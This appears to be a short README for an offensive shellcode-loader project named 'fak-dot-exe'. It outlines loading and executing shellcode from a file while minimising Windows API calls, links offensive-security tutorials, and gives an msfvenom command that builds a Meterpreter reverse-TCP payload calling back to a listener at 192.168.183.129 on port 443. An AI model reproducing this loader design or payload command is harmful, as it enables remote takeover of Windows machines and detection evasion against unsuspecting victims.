# fak-dot-exe
Papi secret sauce 💦

## Key Components
1. how to load shellcode from a file
2. how to execute it
3. How to minimize Windows Api call

## References
- [Read and Execute Shellcode from a .txt File](https://stackoverflow.com/questions/17842499/read-and-execute-shellcode-from-a-txt-file)
- [Writing and Compiling Shellcode in C](https://www.ired.team/offensive-security/code-injection-process-injection/writing-and-compiling-shellcode-in-c)
- [Loading and Executing Shellcode From PE Resources](https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources)
- [Dynamic Shellcode Execution](https://blog.f-secure.com/dynamic-shellcode-execution/)

### Embedding Shellcode as Resource
```
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.183.129 LPORT=443 > meterpreter.bin
```
